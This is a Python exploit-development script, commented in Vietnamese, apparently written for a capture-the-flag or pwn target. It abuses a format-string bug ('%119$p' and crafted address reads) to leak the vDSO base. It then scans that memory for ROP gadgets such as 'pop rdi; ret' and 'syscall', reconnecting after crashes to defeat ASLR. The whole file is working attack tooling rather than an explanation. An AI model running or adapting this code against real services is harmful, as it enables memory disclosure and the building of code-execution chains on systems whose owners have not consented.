#!/usr/bin/env python3
"""Quet vDSO tim hop gadget ROP (stride 4, co tu choi khi vuot qua mapping).

In ra moi gadget dang `pop <reg>; ret` va `syscall` tim thay, kem vi tri tuy
doi so voi vdso va voi `write` de con doc lai o nhung vung khac.
"""
import re
import sys

sys.path.insert(0, ".")
from batch import plan
from probe import Renderer

def q(v):
    return v.to_bytes(8, "little")


PATTERNS = [
    (b"\x58\xc3", "pop rax; ret"),
    (b"\x5e\xc3", "pop rsi; ret"),
    (b"\x5a\xc3", "pop rdx; ret"),
    (b"\x5f\xc3", "pop rdi; ret"),
    (b"\x59\xc3", "pop rcx; ret"),
    (b"\x5b\xc3", "pop rbx; ret"),
    (b"\x5d\xc3", "pop rbp; ret"),
    (b"\x41\x5c\xc3", "pop r12; ret"),
    (b"\x41\x5d\xc3", "pop r13; ret"),
    (b"\x0f\x05", "syscall"),
    (b"\x0f\x05\xc3", "syscall; ret"),
    (b"\xc3", "ret"),
]


def read_strs(r, addrs, timeout=6.0):
    spec, first, off = plan(len(addrs), b"s")
    p = spec + b"\n" + b"." * (off - len(spec) - 1) + b"".join(q(a) for a in addrs)
    out = r.render(p, timeout)
    return out.split(b"|")[:-1]


def fresh():
    r = Renderer()
    r.drain()
    r.buf = b""
    base = int(re.search(rb"0x([0-9a-f]+)", r.render(b"%119$p")).group(1), 16)
    return r, base


def scan(r, base, lo, hi, stride=4, size=20):
    """Quet theo OFFSET; neu crash thi ket noi lai va lay lai vdso base (ASLR doi)."""
    found = {}
    start = lo
    while start < hi:
        offs = list(range(start, min(start + stride * size, hi), stride))
        try:
            parts = read_strs(r, [base + a for a in offs])
        except Exception:
            r, base = fresh()
            start += stride * size
            continue
        for a, s in zip(offs, parts):
            for pat, name in PATTERNS:
                k = s.find(pat)
                if k >= 0:
                    found.setdefault(name, set()).add(a + k)
        start += stride * size
    return found, r, base


if __name__ == "__main__":
    r, base = fresh()
    print(f"[*] vDSO = {base:#x}")
    found, r, base = scan(r, base, 0x100, 0x1000)
    for name, hits in sorted(found.items()):
        hs = sorted(hits)
        print(f"[+] {name:16s} {len(hs):4d}  vdso+{hs[0]:#x} .. vdso+{hs[-1]:#x}")
        print("      " + " ".join(f"{h:#x}" for h in hs[:14]))
    r.close()
